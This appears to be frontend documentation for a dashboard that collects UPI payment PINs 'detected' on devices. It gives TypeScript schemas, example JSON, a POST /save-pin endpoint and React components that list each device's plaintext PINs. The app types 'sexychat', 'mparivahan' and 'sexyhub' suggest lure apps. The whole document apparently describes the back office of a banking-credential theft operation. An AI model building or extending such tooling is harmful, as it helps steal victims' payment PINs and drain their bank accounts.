# UPI PINs - Frontend Documentation

## 📋 Overview

Device API now supports **multiple UPI PINs** per device. Each device can have an array of UPI PIN entries, allowing you to track all PINs detected over time.

## 🔄 Breaking Changes

⚠️ **Important:** The `upi_pin` field is now **deprecated**. Use `upi_pins` array instead.

- **Old (deprecated):** `device.upi_pin` - single string
- **New:** `device.upi_pins` - array of PIN objects

## 📦 Data Structure

### Device Object

```typescript
interface Device {
  device_id: string;
  has_upi: boolean;
  upi_pin: string | null;  // ⚠️ Deprecated - kept for backward compatibility
  upi_pins: UPIPinEntry[] | null;  // ✅ Use this
  upi_detected_at: string | null;
  upi_last_updated_at: string | null;
  // ... other device fields
}
```

### UPI PIN Entry

```typescript
interface UPIPinEntry {
  pin: string;              // 4 or 6 digit PIN
  app_type: string;         // "sexychat" | "mparivahan" | "sexyhub"
  status: string;           // "success" | "failed"
  detected_at: string;      // ISO 8601 datetime string (UTC)
}
```

## 📄 Example JSON Response

```json
{
  "device_id": "DEVICE_ABC123",
  "has_upi": true,
  "upi_pin": null,
  "upi_pins": [
    {
      "pin": "789012",
      "app_type": "sexyhub",
      "status": "success",
      "detected_at": "2025-01-15T14:20:00.000Z"
    },
    {
      "pin": "456789",
      "app_type": "mparivahan",
      "status": "success",
      "detected_at": "2025-01-15T11:15:00.000Z"
    },
    {
      "pin": "123456",
      "app_type": "sexychat",
      "status": "success",
      "detected_at": "2025-01-15T10:30:00.000Z"
    }
  ],
  "upi_detected_at": "2025-01-15T10:30:00.000Z",
  "upi_last_updated_at": "2025-01-15T14:20:00.000Z"
}
```

## 🎯 Common Operations

### 1. Get Latest PIN (Newest)

The `upi_pins` array is **always sorted by `detected_at`** in descending order (newest first).

```typescript
// Method 1: Direct access (recommended)
const latestPin = device.upi_pins?.[0];

// Method 2: Filter by success status
const latestSuccessPin = device.upi_pins?.find(pin => pin.status === "success");

// Method 3: Manual sort (if needed for safety)
const latestPinManual = device.upi_pins
  ?.sort((a, b) => new Date(b.detected_at) - new Date(a.detected_at))[0];
```

### 2. Check if Device has UPI

```typescript
// Method 1: Check has_upi flag
if (device.has_upi) {
  // Device has at least one UPI PIN
}

// Method 2: Check array length
if (device.upi_pins && device.upi_pins.length > 0) {
  // Device has UPI PINs
}
```

### 3. Get All PINs

```typescript
// All PINs (sorted by newest first)
const allPins = device.upi_pins || [];

// Only successful PINs
const successPins = device.upi_pins?.filter(pin => pin.status === "success") || [];

// PINs by app type
const sexychatPins = device.upi_pins?.filter(pin => pin.app_type === "sexychat") || [];
```

### 4. Get Oldest PIN

```typescript
// Since array is sorted newest first, last item is oldest
const oldestPin = device.upi_pins?.[device.upi_pins.length - 1];
```

### 5. Count PINs

```typescript
const totalPins = device.upi_pins?.length || 0;
const successCount = device.upi_pins?.filter(p => p.status === "success").length || 0;
const failedCount = device.upi_pins?.filter(p => p.status === "failed").length || 0;
```

## 💻 React/TypeScript Example

```typescript
import React from 'react';

interface UPIPinEntry {
  pin: string;
  app_type: string;
  status: string;
  detected_at: string;
}

interface Device {
  device_id: string;
  has_upi: boolean;
  upi_pins: UPIPinEntry[] | null;
  upi_last_updated_at: string | null;
}

const UPIPinDisplay: React.FC<{ device: Device }> = ({ device }) => {
  const latestPin = device.upi_pins?.[0];
  const successPins = device.upi_pins?.filter(p => p.status === "success") || [];

  if (!device.has_upi || !device.upi_pins || device.upi_pins.length === 0) {
    return <div>No UPI PINs detected</div>;
  }

  return (
    <div>
      <h3>UPI PINs ({device.upi_pins.length})</h3>
      
      {/* Latest PIN */}
      {latestPin && (
        <div className="latest-pin">
          <strong>Latest PIN:</strong> {latestPin.pin}
          <br />
          <small>
            App: {latestPin.app_type} | 
            Status: {latestPin.status} | 
            Detected: {new Date(latestPin.detected_at).toLocaleString()}
          </small>
        </div>
      )}

      {/* All PINs List */}
      <div className="pin-list">
        {device.upi_pins.map((pin, index) => (
          <div key={index} className={`pin-item ${pin.status}`}>
            <div>PIN: {pin.pin}</div>
            <div>App: {pin.app_type}</div>
            <div>Status: {pin.status}</div>
            <div>Detected: {new Date(pin.detected_at).toLocaleString()}</div>
          </div>
        ))}
      </div>
    </div>
  );
};
```

## 📊 Display Recommendations

### PIN List Table

```typescript
const PinTable: React.FC<{ pins: UPIPinEntry[] }> = ({ pins }) => {
  return (
    <table>
      <thead>
        <tr>
          <th>PIN</th>
          <th>App Type</th>
          <th>Status</th>
          <th>Detected At</th>
        </tr>
      </thead>
      <tbody>
        {pins.map((pin, index) => (
          <tr key={index}>
            <td>{pin.pin}</td>
            <td>{pin.app_type}</td>
            <td>
              <span className={`badge ${pin.status}`}>
                {pin.status}
              </span>
            </td>
            <td>{new Date(pin.detected_at).toLocaleString()}</td>
          </tr>
        ))}
      </tbody>
    </table>
  );
};
```

### Latest PIN Badge

```typescript
const LatestPinBadge: React.FC<{ device: Device }> = ({ device }) => {
  const latestPin = device.upi_pins?.[0];
  
  if (!latestPin) return null;
  
  return (
    <div className="latest-pin-badge">
      <span className="label">Latest PIN:</span>
      <span className="pin-value">{latestPin.pin}</span>
      <span className="app-type">{latestPin.app_type}</span>
      <span className="timestamp">
        {new Date(latestPin.detected_at).toLocaleDateString()}
      </span>
    </div>
  );
};
```

## 🔍 Filtering Examples

### Filter by App Type

```typescript
const getPinsByAppType = (device: Device, appType: string) => {
  return device.upi_pins?.filter(pin => pin.app_type === appType) || [];
};

const sexychatPins = getPinsByAppType(device, "sexychat");
```

### Filter by Date Range

```typescript
const getPinsInDateRange = (
  device: Device, 
  startDate: Date, 
  endDate: Date
) => {
  return device.upi_pins?.filter(pin => {
    const detectedDate = new Date(pin.detected_at);
    return detectedDate >= startDate && detectedDate <= endDate;
  }) || [];
};
```

### Filter Successful PINs Only

```typescript
const successPins = device.upi_pins?.filter(pin => pin.status === "success") || [];
```

## ⚠️ Migration Guide

### Before (Old Code)

```typescript
// ❌ Old way - deprecated
if (device.upi_pin) {
  console.log("PIN:", device.upi_pin);
}
```

### After (New Code)

```typescript
// ✅ New way
const latestPin = device.upi_pins?.[0];
if (latestPin) {
  console.log("PIN:", latestPin.pin);
  console.log("App:", latestPin.app_type);
  console.log("Status:", latestPin.status);
}
```

## 📝 Notes

1. **Sorting:** The `upi_pins` array is automatically sorted by `detected_at` (newest first) on the backend
2. **Null Safety:** Always check if `upi_pins` exists and has items before accessing
3. **Backward Compatibility:** The `upi_pin` field still exists but should not be used in new code
4. **Date Format:** All dates are in ISO 8601 format (UTC timezone)
5. **Status Values:** Only "success" or "failed" are valid status values

## 🔗 Related Endpoints

- `GET /api/devices/{device_id}` - Get single device with all PINs
- `GET /api/devices` - Get list of devices (each includes `upi_pins`)
- `POST /save-pin` - Save new PIN (automatically added to array)

## 📞 Support

If you have questions about the UPI PINs structure, please contact the backend team.

---

**Last Updated:** January 2025
**Version:** 2.0.0

